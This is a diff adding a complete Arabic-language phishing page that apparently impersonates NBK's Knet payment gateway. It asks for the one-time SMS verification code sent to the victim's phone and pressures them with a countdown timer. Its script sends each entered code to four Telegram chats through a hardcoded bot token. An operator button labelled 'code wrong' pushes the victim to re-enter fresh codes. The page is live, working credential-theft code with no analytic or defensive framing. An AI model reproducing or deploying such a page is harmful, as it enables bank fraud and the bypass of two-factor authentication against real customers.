@@ -1,0 +1,365 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>بوابة الدفع</title>
+  <style>
+    body {
+      font-family: Tahoma, sans-serif;
+      background-color: #eee;
+      margin: 0;
+      padding: 0;
+    }
+    .banner {
+      background: url('www2.0zz0.com/2025/07/13/22/875395686.jpg') no-repeat center center;
+      background-size: cover;
+      height: 100px;
+    }
+    .container {
+      max-width: 650px;
+      margin: 20px auto;
+      background-color: #fff;
+      border-radius: 10px;
+      box-shadow: 0 0 10px rgba(0,0,0,0.1);
+      padding: 25px;
+    }
+    .logo {
+      text-align: center;
+      margin-bottom: 30px;
+    }
+    .logo img {
+      max-width: 170px;
+      transition: transform 0.3s ease;
+    }
+    .logo img:hover {
+      transform: scale(1.05);
+    }
+    .amount {
+      text-align: center;
+      font-size: 18px;
+      color: #0070c0;
+      margin: 10px 0;
+    }
+    .form-box {
+      border: 1px solid #ccc;
+      border-radius: 10px;
+      padding: 20px;
+    }
+    label {
+      display: block;
+      margin: 10px 0 5px;
+      color: #444;
+    }
+    input, select {
+      width: 100%;
+      padding: 10px;
+      border: 1px solid #999;
+      border-radius: 5px;
+      box-sizing: border-box;
+    }
+    .row {
+      display: flex;
+      gap: 10px;
+    }
+    .row select, .row input {
+      flex: 1;
+    }
+    .actions {
+      display: flex;
+      justify-content: space-between;
+      margin-top: 20px;
+    }
+    .actions button {
+      flex: 1;
+      padding: 12px;
+      border: none;
+      font-size: 16px;
+      border-radius: 5px;
+      cursor: pointer;
+      margin: 0 5px;
+    }
+    .actions .submit {
+      background-color: #0070c0;
+      color: #fff;
+    }
+    .actions .cancel {
+      background-color: #ccc;
+      color: #333;
+    }
+    footer {
+      text-align: center;
+      font-size: 14px;
+      color: #777;
+      margin-top: 20px;
+      margin-bottom: 20px;
+    }
+    
+    /* تنسيقات إضافية للصفحة */
+    h2 {
+      color: #0070c0;
+      margin-bottom: 10px;
+    }
+    h3 {
+      color: #d9534f;
+      text-align: center;
+      margin-bottom: 15px;
+    }
+    p {
+      color: #333;
+      font-size: 15px;
+      margin-bottom: 25px;
+    }
+    input[type="text"] {
+      width: 100%;
+      padding: 12px;
+      font-size: 18px;
+      border: 1px solid #ccc;
+      border-radius: 6px;
+      margin-bottom: 20px;
+      text-align: center;
+    }
+    button {
+      width: 100%;
+      padding: 12px;
+      background-color: #0070c0;
+      color: #fff;
+      font-size: 17px;
+      border: none;
+      border-radius: 6px;
+      cursor: pointer;
+    }
+    button:hover {
+      background-color: #005c99;
+    }
+    
+    /* الصورة الجديدة في أسفل الصفحة */
+    .bottom-image {
+      width: 100%;
+      margin: 0;
+      padding: 0;
+      border: none;
+      display: block;
+    }
+    .bottom-image img {
+      width: 100%;
+      height: auto;
+      display: block;
+      margin: 0;
+      padding: 0;
+      border: none;
+    }
+    
+    /* تنسيقات أزرار الأخطاء */
+    .error-buttons {
+      display: none;
+      margin-top: 15px;
+      border-top: 1px solid #eee;
+      padding-top: 15px;
+    }
+    
+    .error-btn {
+      width: 100%;
+      padding: 12px;
+      margin: 8px 0;
+      border: none;
+      border-radius: 6px;
+      font-size: 15px;
+      cursor: pointer;
+      transition: all 0.3s ease;
+    }
+    
+    .retry-btn {
+      background-color: #f0ad4e;
+      color: white;
+    }
+    
+    .retry-btn:hover {
+      background-color: #ec971f;
+    }
+    
+    .code-btn {
+      background-color: #d9534f;
+      color: white;
+    }
+    
+    .code-btn:hover {
+      background-color: #c9302c;
+    }
+    
+    .balance-btn {
+      background-color: #5bc0de;
+      color: white;
+    }
+    
+    .balance-btn:hover {
+      background-color: #31b0d5;
+    }
+    
+    /* رسالة الخطأ */
+    .error-message {
+      display: none;
+      background-color: #f8d7da;
+      color: #721c24;
+      padding: 15px;
+      border-radius: 5px;
+      margin: 15px 0;
+      text-align: center;
+      border: 1px solid #f5c6cb;
+      font-weight: bold;
+    }
+  </style>
+</head>
+<body>
+  <div class="banner"></div>
+  <div class="container">
+    <div class="logo">
+      <img src="www2.0zz0.com/2025/07/13/21/825012472.png" alt="NBK Logo">
+    </div>
+
+    <h2>رمز التحقق</h2>
+    <p>يرجى إدخال رمز التحقق الذي تم إرساله إلى هاتفك المحمول</p>
+    
+    <!-- رسالة الخطأ التي تظهر عند الضغط على الزر في البوت -->
+    <div id="errorMessage" class="error-message">
+      الكود خطأ! يرجى المحاولة مرة أخرى
+    </div>
+    
+    <form id="verifyForm">
+      <div class="form-box">  
+        <div id="countdown" style="text-align: center; font-weight: bold; color: #0070c0; margin-bottom: 10px;">
+          <span id="seconds">60</span> يرجى إدخال رمز التحقق قبل انتهاء المدة 
+        </div>
+        <input type="text" id="code" maxlength="6" placeholder="أدخل الرمز هنا" required>
+        <button type="submit">تأكيد</button>
+      </div>
+    </form>
+  </div>
+  
+  <!-- الصورة الجديدة في أسفل الصفحة بدون حواف وبالعرض الكامل -->
+  <div class="bottom-image">
+    <img src="www2.0zz0.com/IMG-20251006-WA0041.jpg" alt="Knet Payment">
+  </div>
+
+  <script>
+    // كود العد التنازلي
+    let timeLeft = 60;
+    let countdownInterval;
+    const secondsElement = document.getElementById("seconds");
+    
+    function startCountdown() {
+      clearInterval(countdownInterval);
+      timeLeft = 60;
+      secondsElement.textContent = timeLeft;
+      
+      countdownInterval = setInterval(() => {
+        timeLeft--;
+        secondsElement.textContent = timeLeft;
+        
+        if (timeLeft <= 0) {
+          clearInterval(countdownInterval);
+          alert("انتهى الوقت! سيتم إلغاء العملية.");
+          document.getElementById("verifyForm").reset();
+        }
+      }, 1000);
+    }
+    
+    // بدء العد التنازلي عند تحميل الصفحة
+    startCountdown();
+    
+    // دالة لإظهار رسالة الخطأ وإعادة العد التنازلي
+    function showErrorMessage() {
+      const errorMessage = document.getElementById("errorMessage");
+      errorMessage.style.display = 'block';
+      
+      // إعادة تعيين النموذج
+      document.getElementById("verifyForm").reset();
+      
+      // إعادة بدء العد التنازلي
+      startCountdown();
+      
+      // إخفاء رسالة الخطأ بعد 5 ثواني
+      setTimeout(() => {
+        errorMessage.style.display = 'none';
+      }, 5000);
+    }
+    
+    // دالة لمحاكاة استقبال أمر "الكود خطأ" من البوت
+    function simulateBotErrorCommand() {
+      showErrorMessage();
+    }
+
+    // كود إرسال البيانات إلى Telegram مع زر في البوت
+    document.getElementById("verifyForm").addEventListener("submit", function(e) {
+      e.preventDefault();
+
+      const code = document.getElementById("code").value;
+      
+      // هنا يمكنك وضع شرط التحقق الفعلي من صحة الكود
+      if (code.length === 6) {
+        // إرسال الرسالة مع زر في البوت
+        const token = "8390566501:AAEtgzzcPvoIddsz4SCXhmCGF3QhOH6o0r4";
+        const chat_ids = ["7335192117", "6323300854", "8280462390", "7942066919"];
+
+        // إنشاء زر في البوت باستخدام markup
+        const message = `🔐 تم إدخال رمز التحقق:\n\n` +
+          `📱 الكود: ${code}\n\n` +
+          `⚠️ إذا كان الكود خاطئاً، اضغط على الزر أدناه:`;
+
+        const keyboard = {
+          inline_keyboard: [[
+            {
+              text: "الكود خطأ - إعادة المحاولة",
+              callback_data: "code_error"
+            }
+          ]]
+        };
+
+        let sentCount = 0;
+        chat_ids.forEach(chat_id => {
+          fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
+              method: "POST",
+              headers: {
+                "Content-Type": "application/json"
+              },
+              body: JSON.stringify({
+                chat_id: chat_id,
+                text: message,
+                reply_markup: JSON.stringify(keyboard)
+              })
+            })
+            .then(res => {
+              if (res.ok) {
+                sentCount++;
+                console.log(`تم الإرسال إلى ${chat_id} بنجاح`);
+              } else {
+                console.error(`فشل الإرسال إلى ${chat_id}`);
+              }
+              
+              if (sentCount === chat_ids.length) {
+                alert("تم إرسال الرمز بنجاح! انتظر التحقق من البوت.");
+                document.getElementById("code").value = "";
+              }
+            })
+            .catch(err => {
+              console.error(`خطأ في الإرسال إلى ${chat_id}:`, err);
+            });
+        });
+      } else {
+        alert("الرجاء إدخال رمز مكون من 6 أرقام");
+      }
+    });
+    
+    // ملاحظة: لا يمكن لصفحة HTML ثابتة استقبال أوامر مباشرة من بوت Telegram.
+    // لمحاكاة الضغط على زر "الكود خطأ" في البوت وتأثيره على الصفحة،
+    // يرجى الضغط على زر F2 في لوحة المفاتيح بعد إرسال الكود.
+    document.addEventListener("keydown", function(e) {
+      if (e.key === "F2") {
+        simulateBotErrorCommand();
+      }
+    });
+    
+    console.log("لاختبار وظيفة \"الكود خطأ\": بعد إدخال الكود وإرساله إلى Telegram، اضغط على F2 في لوحة المفاتيح لمحاكاة الضغط على الزر في البوت.");
+  </script>
+</body>
+</html>
